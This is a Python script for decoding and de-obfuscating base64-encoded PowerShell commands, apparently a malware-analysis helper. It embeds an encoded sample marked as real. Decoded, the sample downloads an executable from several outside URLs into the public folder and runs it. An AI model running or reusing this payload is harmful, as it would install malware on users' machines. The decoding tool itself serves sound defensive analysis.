import sys
import base64
import binascii
import string

# Purpose:
#    Decode base64 encoded powershell command lines and additional characters used for obfuscation

# WARNING: Real example of a malicious base64 encoded powershell command
b64_cmd = "JABBAFcARgA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABxAE0AdwA9ACcAaAB0AHQAcAA6AC8ALwBqAG8AYgBhAHIAYgBhAC4AYwBvAG0ALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8AbABsAFoAeABqAFoAaABNAEAAaAB0AHQAcAA6AC8ALwBjAGgAYQBsAGwAZQBuAGcAZQByAGIAYQBsAGwAdABvAHUAcgBuAGEAbQBlAG4AdAAuAGMAbwBtAC8AbgBtAEgANQBCAE8AbQBYAEAAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGUAdQByAGUAawBhAGwAbwBnAGkAcwB0AGkAYwBzAC4AYwBvAC4AaQBkAC8AagBzAG4ALwBlAG0AYwAvAGUAbQBjAF8AZAByAGkAdgBlAHIALwB1AHAAbABvAGEAZABzAC8AQwBxAGkARgBSAEEAeAB1AEAAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGkAbgBhAG4AYwBzAHAAbwByAC4AYwBvAG0ALwA0AEcAMgA0AGMAcwBiAEAAaAB0AHQAcAA6AC8ALwBmAGwAdQBvAHIAZQBzAGMAZQBuAHQALgBjAGMALwBXAGUATQBpAEcAMQBPADQAJwAuAFMAcABsAGkAdAAoACcAQAAnACkAOwAkAHAAawB6ACAAPQAgACcAMQA3ADAAJwA7ACQAVwBCAE0APQAkAGUAbgB2ADoAcAB1AGIAbABpAGMAKwAnAFwAJwArACQAcABrAHoAKwAnAC4AZQB4AGUAJwA7AGYAbwByAGUAYQBjAGgAKAAkAFIAegBvACAAaQBuACAAJABxAE0AdwApAHsAdAByAHkAewAkAEEAVwBGAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFIAegBvACwAIAAkAFcAQgBNACkAOwBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAFcAQgBNADsAYgByAGUAYQBrADsAfQBjAGEAdABjAGgAewB9AH0AIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA=="

def base64_decode(encoded_cmd):
    try:
        decoded_bytes = base64.b64decode(encoded_cmd)
        return decoded_bytes.decode("utf-8")
    except binascii.Error:
        return None
        
def get_frequency_non_alphanumeric(cmd):
    frequency = {}
    for c in cmd:
        if c not in string.ascii_lowercase and \
            c not in string.ascii_uppercase and \
            c not in string.digits:
            frequency[c] = frequency.get(c,0) + 1
    return frequency
    
def remove_most_frequent_non_alphanumeric(cmd):
    frequency = get_frequency_non_alphanumeric(cmd)
    most_frequent = sorted(frequency.items(), key=lambda item: item[1], reverse=True)[0]
    if most_frequent[1] / len(cmd) >= 0.5:
        new_cmd = cmd.replace(most_frequent[0], "")
        return new_cmd
    return cmd

def decode(cmd):
    b64_decoded_cmd = base64_decode(cmd)
    decoded_cmd = remove_most_frequent_non_alphanumeric(b64_decoded_cmd)
    print(decoded_cmd)

def main(cmd):
    decode(cmd)

if __name__ == "__main__":
    main(sys.argv[1])
    #main(b64_cmd)